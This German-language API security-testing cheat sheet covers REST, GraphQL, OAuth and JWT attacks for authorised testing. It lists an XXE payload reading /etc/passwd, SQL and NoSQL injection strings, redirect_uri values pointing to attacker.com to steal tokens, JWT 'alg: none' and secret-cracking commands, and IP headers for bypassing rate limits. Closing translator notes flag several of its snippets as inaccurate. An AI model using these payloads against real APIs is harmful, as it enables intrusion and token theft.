# 🔌 Spickzettel für API-Sicherheitstests

<!-- language-home-navigation -->
[🏠 Deutsche Startseite](../../README.de.md) • [🌐 Languages](../../README.md#-available-languages)

[🇮🇹 Versione Italiana](README.it.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
   █████╗ ██████╗ ██╗    ███████╗███████╗ ██████╗██╗   ██╗██████╗ ██╗████████╗██╗   ██╗
  ██╔══██╗██╔══██╗██║    ██╔════╝██╔════╝██╔════╝██║   ██║██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
  ███████║██████╔╝██║    ███████╗█████╗  ██║     ██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
  ██╔══██║██╔═══╝ ██║    ╚════██║██╔══╝  ██║     ██║   ██║██╔══██╗██║   ██║     ╚██╔╝  
  ██║  ██║██║     ██║    ███████║███████╗╚██████╗╚██████╔╝██║  ██║██║   ██║      ██║   
  ╚═╝  ╚═╝╚═╝     ╚═╝    ╚══════╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝      ╚═╝   
```

<p align="center">
  <img src="https://img.shields.io/badge/API-Security-blue?style=for-the-badge" alt="API">
  <img src="https://img.shields.io/badge/REST-Testing-green?style=for-the-badge" alt="REST">
  <img src="https://img.shields.io/badge/GraphQL-red?style=for-the-badge" alt="GraphQL">
</p>

---

## 📋 Inhaltsverzeichnis

- [OWASP API Top 10](#-owasp-api-top-10)
- [REST-APIs prüfen](#-rest-apis-prüfen)
- [GraphQL prüfen](#-graphql-prüfen)
- [Angriffe auf die Authentifizierung](#-angriffe-auf-die-authentifizierung)
- [JWT-Angriffe](#-jwt-angriffe)
- [Häufige Schwachstellen](#-häufige-schwachstellen)

---

## 🔴 OWASP API Top 10

| # | Schwachstelle | Beschreibung |
|---|---------------|-------------|
| 1 | **BOLA** | Fehlerhafte Autorisierung auf Objektebene |
| 2 | **Fehlerhafte Authentifizierung** | Schwächen der Authentifizierung |
| 3 | **BOPLA** | Fehlerhafte Autorisierung auf Objekteigenschaftsebene |
| 4 | **Unbegrenzter Ressourcenverbrauch** | Keine Begrenzung der Anfragerate |
| 5 | **BFLA** | Fehlerhafte Autorisierung auf Funktionsebene |
| 6 | **SSRF** | Server-Side Request Forgery (serverseitige Anfragefälschung) |
| 7 | **Sicherheitsrelevante Fehlkonfiguration** | Standardeinstellungen |
| 8 | **Fehlender Schutz** | Geschäftsablauf |
| 9 | **Unzureichende Verwaltung der API-Ressourcen** | Alte APIs |
| 10 | **Unsichere Nutzung externer APIs** | Drittanbieter |

---

## 🌐 REST-APIs prüfen

### Ermittlung und Enumeration

```bash
# API-Endpunkte finden
ffuf -u https://api.target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt

# Versionen erfassen
/api/v1/users
/api/v2/users
/api/v3/users
/api/beta/users
/api/latest/users

# Häufige Pfade
/api/
/api/v1/
/api/v2/
/rest/
/graphql
/swagger/
/openapi.json
/api-docs
/swagger.json
/swagger-ui/
/docs/
```

### HTTP-Methoden prüfen

```bash
# Alle Methoden prüfen
curl -X GET https://api.target.com/users/1
curl -X POST https://api.target.com/users
curl -X PUT https://api.target.com/users/1
curl -X PATCH https://api.target.com/users/1
curl -X DELETE https://api.target.com/users/1
curl -X OPTIONS https://api.target.com/users

# HTTP-Methode überschreiben
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://api.target.com/users/1
curl -X POST -H "X-Method-Override: PUT" https://api.target.com/users/1
```

### Parameter verändern

```bash
# BOLA/IDOR
GET /api/users/1      # Eigene ID
GET /api/users/2      # ID eines anderen Benutzers
GET /api/users/0
GET /api/users/-1
GET /api/users/999999

# Mehrfach vorkommende Parameter (Parameter Pollution)
/api/users?id=1&id=2
/api/users?id[]=1&id[]=2

# Umgehung durch Kodierung
/api/users/1%00
/api/users/1%0a
/api/users/1%2e%2e%2f2
```

### Angriffe über den Content-Type

```bash
# Content-Type ändern
Content-Type: application/json
Content-Type: application/xml
Content-Type: application/x-www-form-urlencoded
Content-Type: text/xml
Content-Type: text/plain

# XXE über den Content-Type
curl -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user>&xxe;</user>'
```

### Mass Assignment (ungeprüfte Übernahme zusätzlicher Felder)

```bash
# Zusätzliche Felder hinzufügen
POST /api/users
{
  "username": "test",
  "email": "test@test.com",
  "role": "admin",           # Versuchsweise hinzufügen
  "isAdmin": true,           # Versuchsweise hinzufügen
  "balance": 99999,          # Versuchsweise hinzufügen
  "verified": true           # Versuchsweise hinzufügen
}

# Arrays verwenden
{
  "user": {
    "name": "test",
    "role_ids": [1, 2, 3]
  }
}
```

---

## 📊 GraphQL prüfen

### Introspection (Schema abfragen)

```graphql
# Vollständige Introspection-Abfrage laut Vorlage
query {
  __schema {
    types {
      name
      fields {
        name
        args { name }
      }
    }
  }
}

# Einfache Introspection
{__schema{types{name,fields{name}}}}

# Alle Query-Felder abrufen
{__schema{queryType{fields{name,description}}}}

# Alle Mutationsfelder abrufen
{__schema{mutationType{fields{name,description}}}}
```

### Häufige Angriffe

```graphql
# IDOR
query { user(id: 2) { email, password } }

# Batching-Angriff
query {
  user1: user(id: 1) { email }
  user2: user(id: 2) { email }
  user3: user(id: 3) { email }
}

# DoS durch verschachtelte Abfrage
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          name
        }
      }
    }
  }
}

# Vorschläge für Feldnamen
{ user { a }  # Soll laut Vorlage gültige Felder vorschlagen
```

### SQL-Injection in GraphQL

```graphql
# SQLi in Argumenten
query { user(name: "' OR '1'='1") { id } }
query { users(filter: "admin'--") { id } }

# NoSQL-Injection
query { user(query: "{$gt: ''}") { id } }
```

### Deaktivierte Introspection umgehen

```graphql
# Alternative Introspection
query { __type(name: "User") { fields { name } } }

# Feldnamen mit ffuf systematisch ausprobieren
# Wortliste mit häufigen GraphQL-Feldnamen verwenden
```

---

## 🔐 Angriffe auf die Authentifizierung

### API-Schlüssel prüfen

```bash
# API-Schlüssel finden
# JS-Dateien, mobile Apps und GitHub prüfen

# Schlüssel an verschiedenen Stellen prüfen
curl -H "X-API-Key: KEY" https://api.target.com
curl -H "Authorization: Bearer KEY" https://api.target.com
curl -H "api-key: KEY" https://api.target.com
curl "https://api.target.com?api_key=KEY"
```

### OAuth-/OAuth2-Angriffe

```bash
# Token-Diebstahl über redirect_uri
?redirect_uri=https://attacker.com
?redirect_uri=https://target.com.attacker.com
?redirect_uri=https://target.com%40attacker.com
?redirect_uri=https://target.com/callback/../../../attacker

# Prüfung des State-Parameters umgehen
# State-Parameter entfernen
# Denselben State-Wert für verschiedene Benutzer verwenden

# Offenlegung von Tokens
# Referer-Header auf offengelegte Tokens prüfen
```

### Sitzungsverwaltung

```bash
# Tokens erfassen
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

# Sind alte Tokens nach der Abmeldung weiterhin gültig?
# Probleme bei der Token-Rotation
# Wiederverwendung von Tokens über Sitzungen hinweg
```

---

## 🎫 JWT-Angriffe

### JWT dekodieren

```bash
# Online: jwt.io
# Kommandozeile
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." | base64 -d
```

### Algorithmusverwechslung (Algorithm Confusion)

```bash
# alg auf none ändern
{
  "alg": "none",
  "typ": "JWT"
}
# Signatur entfernen

# HS256 → RS256 laut Vorlage
# Öffentlichen Schlüssel als HMAC-Geheimnis verwenden
```

### Signaturprüfung umgehen

```bash
# Signatur entfernen (Punkte beibehalten)
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.

# Schwaches Geheimnis durch systematisches Ausprobieren ermitteln
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Häufige schwache Geheimnisse
secret
password
123456
your-256-bit-secret
```

### Claims verändern

```javascript
// Benutzer-Claims ändern
{
  "sub": "1234567890",
  "name": "admin",        // Auf admin ändern
  "role": "admin",        // Rolle aufwerten
  "admin": true,          // Administrator-Flag hinzufügen
  "exp": 9999999999       // Gültigkeit verlängern
}
```

### JWT-Werkzeuge

```bash
# jwt_tool
python3 jwt_tool.py <JWT>
python3 jwt_tool.py <JWT> -T    # Verändern
python3 jwt_tool.py <JWT> -C -d wordlist.txt  # Geheimnis ermitteln

# jwtcrack
./jwtcrack <JWT>
```

---

## 🐛 Häufige Schwachstellen

### Begrenzung der Anfragerate umgehen

```bash
# Zu prüfende Header
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1

# Groß-/Kleinschreibung ändern
X-FORWARDED-FOR: 127.0.0.1

# Nullbyte
X-Forwarded-For: 127.0.0.1%00

# Verschiedene Endpunkte
/api/login
/API/LOGIN
/api/Login
/api/login/
```

### BOLA (Fehlerhafte Autorisierung auf Objektebene)

```bash
# Verändern der ID prüfen
GET /api/orders/123    # Eigene Bestellung
GET /api/orders/124    # Bestellung eines anderen Benutzers

# UUIDs erraten
# Auf vorhersagbare Muster prüfen
# Fortlaufende und zeitstempelbasierte Werte prüfen

# ID in verschiedenen Formaten
/api/users/1
/api/users/001
/api/users/user_1
/api/users/0x1
```

### BFLA (Fehlerhafte Autorisierung auf Funktionsebene)

```bash
# Als normaler Benutzer auf Administrationsendpunkte zugreifen
GET /api/admin/users
POST /api/admin/config
DELETE /api/admin/user/1

# Abhängig von der HTTP-Methode
GET /api/users     # Erlaubt
POST /api/users    # Sollte Administratoren vorbehalten sein?
DELETE /api/users  # Sollte Administratoren vorbehalten sein?
```

### Unzureichende Verwaltung der API-Ressourcen

```bash
# Alte API-Versionen
/api/v1/users    # Kann mehr Schwachstellen enthalten
/api/v2/users    # Aktuell laut Vorlage
/api/v3/users    # Beta beziehungsweise unveröffentlicht

# Entwicklungsendpunkte
/api/debug/
/api/test/
/api/internal/
/api/dev/
```

---

## 🛠️ Werkzeuge

| Werkzeug | Zweck |
|------|---------|
| **Burp Suite** | API-Verkehr abfangen und prüfen |
| **Postman** | APIs erkunden |
| **Insomnia** | Client für REST und GraphQL |
| **graphql-voyager** | GraphQL darstellen |
| **jwt_tool** | JWTs prüfen |
| **Arjun** | Parameter ermitteln |

---

## 📚 Ressourcen

- [OWASP API Security Top 10](https://owasp.org/API-Security/)
- [GraphQL Voyager](https://apis.guru/graphql-voyager/)
- [JWT.io](https://jwt.io/)

---

<p align="center">
  <b>🔌 Die eigenen APIs absichern!</b><br>
  <i>Nur für autorisierte Tests!</i>
</p>


---

## Hinweise zur deutschen Ausgabe

> **OWASP-Liste:** Die Tabelle der Vorlage ist keine korrekte nummerierte Wiedergabe der API Top 10 von 2023. Dort ist API6 „Unrestricted Access to Sensitive Business Flows“, API7 SSRF, API8 „Security Misconfiguration“ und API9 „Improper Inventory Management“. Die ursprünglichen Tabellenzeilen und Beispiele bleiben als Ausgangsvorlage erhalten. Ressourcenverbrauch umfasst zudem mehr als fehlende Anfrageratenbegrenzung. *BOLA*, *BOPLA* und *BFLA* unterscheiden die Autorisierung von Objekten, einzelnen Eigenschaften und Funktionen. [OWASP: API Top 10](https://devguide.owasp.org/en/07-training-education/07-api-top-ten/).

> **JWT und Signaturen:** Ein kompakter signierter JWT besteht aus getrennten Base64url-Segmenten; ein gekürztes Token mit Punkten lässt sich nicht als ein einziger gewöhnlicher Base64-Block dekodieren. Das bekannte Verwechslungsszenario mit einem öffentlichen RSA-Schlüssel als HMAC-Geheimnis geht von erwarteter RS256-Prüfung zu HS256 aus; der Kommentar der Vorlage nennt die umgekehrte Richtung. Ein veränderter Claim, `alg: none` oder entfernte Signatur funktioniert nicht gegen eine korrekt konfigurierte Prüfung. Werkzeuge und Hashformate müssen zur tatsächlichen Eingabe passen. Originaltokens, JSON-Werte und Befehle bleiben unverändert. [RFC 7519](https://www.rfc-editor.org/rfc/rfc7519.html), [PortSwigger: Algorithmusverwechslung](https://portswigger.net/web-security/jwt/algorithm-confusion).

> **GraphQL und Beispielgrenzen:** Die als vollständige Introspection bezeichnete Abfrage zeigt nur einen Ausschnitt der Schemainformationen. Auch `__type` gehört zur Introspection und ist kein allgemeiner Weg an ihrer Deaktivierung vorbei. Das Feldvorschlagsbeispiel enthält eine nicht geschlossene äußere geschweifte Klammer. Verfügbare Felder, Aliase, Resolver und deren Eingabeprüfung bestimmen, ob ein Beispiel überhaupt zum Schema passt; eine GraphQL-Abfrage allein beweist keine SQL-/NoSQL-Injection oder fehlende Autorisierung. [GraphQL: Introspection](https://graphql.org/learn/introspection/).

> **HTTP und Auswertung:** Die XXE-curl-Zeile enthält kein Ziel und ist kein vollständiger Aufruf. Viele mit `bash` markierte Zeilen sind HTTP-Pfade, Header oder schematische Roh-Anfragen statt Shell-Befehle. JSON mit `#`- beziehungsweise `//`-Erläuterungen ist keine unmittelbar versandfertige JSON-Nachricht. Content-Type, Method-Override-Header und IP-Header wirken nur bei entsprechender serverseitiger Verarbeitung; sie garantieren keine Umgehung. Ein veränderter Objektbezeichner ist erst mit einem unzulässigen Zugriff ein Autorisierungsbefund. Es wurde kein Beispiel und keine API-Anfrage ausgeführt.
